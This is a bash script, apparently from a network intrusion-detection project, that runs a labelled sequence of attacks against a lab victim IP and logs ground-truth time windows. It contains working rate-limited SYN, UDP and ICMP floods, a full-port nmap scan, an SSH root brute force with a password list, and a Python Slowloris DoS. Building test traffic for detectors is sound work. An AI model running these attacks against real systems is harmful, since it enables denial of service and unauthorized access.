#!/bin/bash
# ============================================================
#  attack-runner.sh (v2 — KONTROLLÜ) — GROUND TRUTH üreteci
#
#  experiment1'e göre iyileştirmeler:
#   - Floodlar SINIRLI HIZDA (--flood YOK) → host/dashboard donmaz, paket kuyruğu
#     taşmaz, XGBoost akışları düzgün oluşur.
#   - Floodlarda SABİT kaynak port (-k -s) → kurban cevapları "PortScan" sanılmaz
#     (backscatter mislabel düzeltildi).
#   - nmap tüm portları SINIRLI hızda tarar → gerçek bir tarama PENCERESİ oluşur.
#   - Slowloris PURE PYTHON (slowhttptest kurulumu gerekmez) → yavaş-DoS senaryosu.
#   - Daha zengin benign trafik → FP ölçümü daha anlamlı.
#
#  ⚠️ YALNIZCA KENDİ İZOLE TEST LABORATUVARINDA. Saldırgan VM'de root ile çalışır.
#  Kullanım:  sudo bash attack-runner.sh <KURBAN_IP> [SÜRE_SN]
# ============================================================
set -u

VICTIM="${1:-}"
DUR="${2:-25}"          # her saldırının süresi (sn)
GAP="${3:-10}"          # saldırılar arası boşluk (pencereleri net ayırır)
RATE_US="${RATE_US:-2500}"   # hping3 paket aralığı (mikrosn): 2500us ≈ 400 pps
OUT="${OUT:-ground_truth.csv}"

if [ -z "$VICTIM" ]; then
    echo "[HATA] Kurban IP gerekli. Kullanım: sudo bash attack-runner.sh <KURBAN_IP> [SÜRE]"
    exit 1
fi

SRC=$(ip -o -4 route get "$VICTIM" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}')
[ -z "$SRC" ] && SRC=$(hostname -I | awk '{print $1}')

echo "============================================"
echo "  attack-runner v2 (kontrollü) — ground truth"
echo "  Saldırgan: $SRC   Kurban: $VICTIM"
echo "  Süre/saldırı: ${DUR}s  Boşluk: ${GAP}s  Flood hızı: ~$((1000000/RATE_US)) pps"
echo "  Çıktı: $OUT"
echo "============================================"

# Her çalıştırma TEMİZ başlar (önceki koşunun pencereleriyle karışmasın!)
echo "start_iso,end_iso,start_epoch,end_epoch,label,attack_type,mitre,src,dst,dst_port,tool" > "$OUT"
have() { command -v "$1" >/dev/null 2>&1; }

run_window() {
    local label="$1" attack="$2" mitre="$3" port="$4" tool="$5"; shift 5
    if [ -n "$tool" ] && ! have "$tool"; then
        echo "[ATLA] $attack — '$tool' kurulu değil."
        return
    fi
    local s_iso s_ep e_iso e_ep
    s_iso=$(date +%Y-%m-%dT%H:%M:%S); s_ep=$(date +%s)
    echo ">>> [$attack] başladı ($s_iso)"
    "$@" >/dev/null 2>&1
    e_iso=$(date +%Y-%m-%dT%H:%M:%S); e_ep=$(date +%s)
    echo "    [$attack] bitti   ($e_iso)"
    echo "$s_iso,$e_iso,$s_ep,$e_ep,$label,$attack,$mitre,$SRC,$VICTIM,$port,$tool" >> "$OUT"
    sleep "$GAP"
}

# ── Zengin iyi huylu trafik ──
benign_traffic() {
    local end=$(( $(date +%s) + DUR ))
    while [ "$(date +%s)" -lt "$end" ]; do
        curl -s -m 2 "http://$VICTIM/" >/dev/null 2>&1 || true
        curl -s -m 2 "http://$VICTIM/index.html" >/dev/null 2>&1 || true
        ping -c 1 -W 1 "$VICTIM" >/dev/null 2>&1 || true
        nslookup "$VICTIM" >/dev/null 2>&1 || true
        sleep 1
    done
}

# ── SSH brute force (port 22, >=20 pps) ──
ssh_bruteforce() {
    if have hydra; then
        local wl; wl=$(mktemp)
        printf '123456\npassword\nroot\nadmin\ntoor\n12345678\nqwerty\n111111\nletmein\nubuntu\nraspberry\nuser\n' > "$wl"
        timeout "$DUR" hydra -l root -P "$wl" -t 8 -W 1 "ssh://$VICTIM" >/dev/null 2>&1 || true
        rm -f "$wl"
    else
        local end=$(( $(date +%s) + DUR ))
        while [ "$(date +%s)" -lt "$end" ]; do
            for j in $(seq 1 30); do timeout 1 bash -c "echo > /dev/tcp/$VICTIM/22" 2>/dev/null & done
            wait; sleep 0.2
        done
    fi
}

# ── Slowloris (saf Python — slowhttptest gerekmez) ──
slowloris_attack() {
    python3 - "$VICTIM" "$DUR" <<'PY'
import socket, sys, time
host, dur = sys.argv[1], int(sys.argv[2])
socks = []
for _ in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, 80))
        s.send(("GET /?%d HTTP/1.1\r\nHost: %s\r\n" % (time.time(), host)).encode())
        socks.append(s)
    except Exception:
        pass
end = time.time() + dur
while time.time() < end:
    for s in list(socks):
        try:
            s.send(b"X-a: b\r\n")        # yarım istek — bağlantıyı açık tut
        except Exception:
            socks.remove(s)
    time.sleep(5)
for s in socks:
    try: s.close()
    except Exception: pass
PY
}

echo ""
echo "### Sensör CANLI mı? Pi logu temizlendi mi? Saatler senkron mu? (README'ye bak) ###"
echo ""

# 1) İyi huylu taban (FP penceresi)
run_window BENIGN  BENIGN     -      0   ""        benign_traffic

# 2) Port tarama — tüm portlar, sınırlı hız → gerçek pencere (T1046)
run_window ANOMALY PortScan   T1046  0   nmap      timeout "$DUR" nmap -sS -p1-65535 --max-rate 1500 -n "$VICTIM"

# 3) SYN flood — sabit kaynak port, kontrollü hız (T1498)
run_window ANOMALY SYN_Flood  T1498  80  hping3    timeout "$DUR" hping3 -S -p 80 -i u${RATE_US} -k -s 55555 "$VICTIM"

# 4) UDP flood — sabit kaynak port, kontrollü hız (T1498)
run_window ANOMALY DoS_Flood  T1498  53  hping3    timeout "$DUR" hping3 --udp -p 53 -i u${RATE_US} -k -s 55556 "$VICTIM"

# 5) ICMP flood — kontrollü hız (T1498)
run_window ANOMALY DoS_Flood  T1498  0   hping3    timeout "$DUR" hping3 --icmp -i u${RATE_US} "$VICTIM"

# 6) SSH brute force (T1110)
run_window ANOMALY BruteForce T1110  22  ""        ssh_bruteforce

# 7) Slowloris — yavaş HTTP DoS (T1499). Kural katmanı KAÇIRABİLİR (dürüst FN/XGBoost testi)
run_window ANOMALY Slowloris  T1499  80  python3   slowloris_attack

# 8) Kapanış benign penceresi
run_window BENIGN  BENIGN     -      0   ""        benign_traffic

echo ""
echo "Bitti. Ground truth: $OUT  →  Pi'deki logs/detections.jsonl ile evaluate_live.ipynb'a verin."
